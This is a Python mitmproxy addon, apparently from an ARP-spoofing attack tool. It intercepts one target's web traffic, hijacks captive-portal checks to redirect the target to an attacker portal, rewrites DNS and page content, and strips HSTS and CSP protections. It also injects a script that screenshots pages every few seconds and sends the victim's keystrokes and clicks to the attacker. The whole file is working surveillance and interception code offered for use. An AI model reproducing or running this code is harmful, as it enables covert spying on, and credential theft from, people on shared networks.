import os
import json
import socket
import base64
from mitmproxy import http
class SnARPof_actions:
    def __init__(self):
        self.GUI_PORT=9999
        self.GUI_SOCKET=None
        self.JS_PATH='html2canvas.min.js'
        self.DNS_RULES_PATH='dns_rules.json'
        self.URL_RULES_PATH='url_rules.json'
        self.HTML_RULES_PATH='html_rules.json'
        self.HTML_INJECT_CODE_PATH='html_inject.txt'
        self.IS_SPYING_PATH='is_spying.txt'
        self.CAPTIVE_PORTAL_DOMAINS=['connectivitycheck.gstatic.com', 'clients3.google.com', 'clients4.google.com', 'connectivitycheck.android.com', 'android.clients.google.com', 'www.gstatic.com', 'captive.apple.com', 'www.appleiphonecell.com', 'www.apple.com', 'www.itools.info', 'www.ibook.info', 'www.thinkdifferent.us', 'www.airport.us', 'apple.com', 'www.msftconnecttest.com', 'www.msftncsi.com', 'ipv6.msftncsi.com', 'edge-http.microsoft.com', 'detectportal.firefox.com', 'detectportal.brave-http-only.com', 'nmcheck.gnome.org', 'spectrum.s3.amazonaws.com', 'neverssl.com']
        self.ATTACKER_IP=socket.gethostbyname(socket.gethostname())
        self.PORTAL_URL=f'http://{self.ATTACKER_IP}:80'
        with open('target_ip.txt', 'r', encoding='utf-8') as f:
            self.TARGET_IP=f.read().strip()
    def request(self, flow: http.HTTPFlow) -> None:
        try:
            with open(self.DNS_RULES_PATH, 'r', encoding='utf-8') as f:
                dns_rules=json.load(f)
            with open(self.URL_RULES_PATH, 'r', encoding='utf-8') as f:
                url_rules=json.load(f)
            with open(self.IS_SPYING_PATH, 'r', encoding='utf-8') as f:
                is_spying=f.read()
            domain=flow.request.pretty_host
            url=flow.request.pretty_url
            path=flow.request.path
            if flow.request.scheme=='http':
                if domain in self.CAPTIVE_PORTAL_DOMAINS:
                    flow.response=http.Response.make(302, f'<html><head><meta http-equiv="refresh" content="0;url={self.PORTAL_URL}"><title>PortalSec</title><script>window.location.href="{self.PORTAL_URL}";</script></head><body><h1>Redirecting...</h1><p><a href="{self.PORTAL_URL}">Click here if not redirected</a></p></body></html>'.encode('utf-8'), {'Content-Type': 'text/html', 'Cache-Control': 'no-cache, no-store, must-revalidate', 'Pragma': 'no-cache', 'Expires': '0', 'Location': self.PORTAL_URL})
            if (domain in dns_rules) or (domain+'.' in dns_rules):
                flow.request.host=dns_rules[domain]
                flow.request.headers['Host']=domain
            if (url in url_rules) or (url+'/' in url_rules):
                html_payload=url_rules[url]
                if '</body>' not in html_payload:
                    html_payload=f'<body>{html_payload}</body>'
                flow.response=http.Response.make(200, html_payload.encode('utf-8'), {'Content-Type': 'text/html'})
            if is_spying=='TRUE' and '/_recorder_internal_/' in path:                
                if 'html2canvas.min.js' in path:
                    with open(self.JS_PATH, 'rb') as f:
                        flow.response=http.Response.make(200, f.read(), {'Content-Type': 'text/javascript'})
                elif 'frame' in path:
                    self.send_to_gui({'type': 'frame', 'data': base64.b64encode(flow.request.content).decode('utf-8', errors='ignore')})
                    flow.response=http.Response.make(200, b'OK')
                elif 'keystroke' in path:
                    self.send_to_gui({'type': 'keystroke', 'data': flow.request.get_text()})
                    flow.response=http.Response.make(200, b'OK')
                elif 'click' in path:
                    self.send_to_gui({'type': 'click', 'data': flow.request.get_text()})
                    flow.response=http.Response.make(200, b'OK')
        except Exception as e:
            os.system(f'msg * "Error while intercepting traffic in mitmproxy: {e}"')
    def response(self, flow: http.HTTPFlow) -> None:
        if flow.response.status_code==302 and flow.response.headers.get('Location')==self.PORTAL_URL:
            return
        if flow.response and 'text/html' in flow.response.headers.get('Content-Type', ''):
            flow.response.headers.pop('Strict-Transport-Security', None)
            flow.response.headers.pop('Content-Security-Policy', None)
            if flow.client_conn and flow.client_conn.address[0]==self.TARGET_IP:
                try:
                    with open(self.HTML_RULES_PATH, 'r', encoding='utf-8') as f:
                        html_rules=json.load(f)
                    with open(self.IS_SPYING_PATH, 'r', encoding='utf-8') as f:
                        is_spying=f.read()
                    with open(self.HTML_INJECT_CODE_PATH, 'r', encoding='utf-8') as f:
                        html_inject_code=f.read()
                    if is_spying=='TRUE':
                        flow.response.headers.pop('X-WebKit-CSP', None)
                        script='''
                        <script src="/_recorder_internal_/html2canvas.min.js"></script>
                        <script>
                            function start() {
                                if(!window.html2canvas) return setTimeout(start, 1000);
                                const opts = { scale: 0.5, logging: false, useCORS: true, x: window.scrollX, y: window.scrollY, width: window.innerWidth, height: window.innerHeight };
                                const buttons = { 0: 'leftclick', 1: 'middleclick', 2: 'rightclick' };
                                async function loop() {
                                    try {
                                        const canvas = await html2canvas(document.body, opts);
                                        canvas.toBlob(b => {
                                            if(b) fetch('/_recorder_internal_/frame', { method: 'POST', body: b });
                                        }, 'image/jpeg', 1.0);
                                    } catch(e) {}
                                    setTimeout(loop, 5000);
                                }
                                document.addEventListener('input', e => {
                                    fetch('/_recorder_internal_/keystroke', {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({ key: e.data, t: Date.now(), url: window.location.href })
                                    });
                                });
                                document.addEventListener('mousedown', e => {
                                    fetch('/_recorder_internal_/click', {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({ event: buttons[e.button] || 'other', x: e.pageX, y: e.pageY, t: Date.now(), url: window.location.href })
                                    });
                                });
                                loop();
                            }
                            start();
                        </script>
                        '''
                        flow.response.content=flow.response.content.replace(b'</body>', script.encode('utf-8')+b'</body>')
                    if flow.server_conn and flow.server_conn.ip_address[0]!=self.ATTACKER_IP:
                        for content, replacement in html_rules.items():
                            flow.response.content=flow.response.content.replace(content.encode('utf-8'), replacement.encode('utf-8'))
                        flow.response.content=flow.response.content.replace(b'</body>', html_inject_code.encode('utf-8')+b'</body>')
                except Exception as e:
                    os.system(f'msg * "Error while intercepting traffic in mitmproxy: {e}"')                
    def send_to_gui(self, data):
        try:
            if self.GUI_SOCKET is None:
                self.GUI_SOCKET=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.GUI_SOCKET.connect(('127.0.0.1', self.GUI_PORT))
            msg=(json.dumps(data)+'\n').encode('utf-8')
            self.GUI_SOCKET.sendall(msg)
        except Exception as e:
            if self.GUI_SOCKET:
                self.GUI_SOCKET.close()
                self.GUI_SOCKET=None
    def done(self):
        if self.GUI_SOCKET:
            self.GUI_SOCKET.close()
            self.GUI_SOCKET=None
addons=[SnARPof_actions()]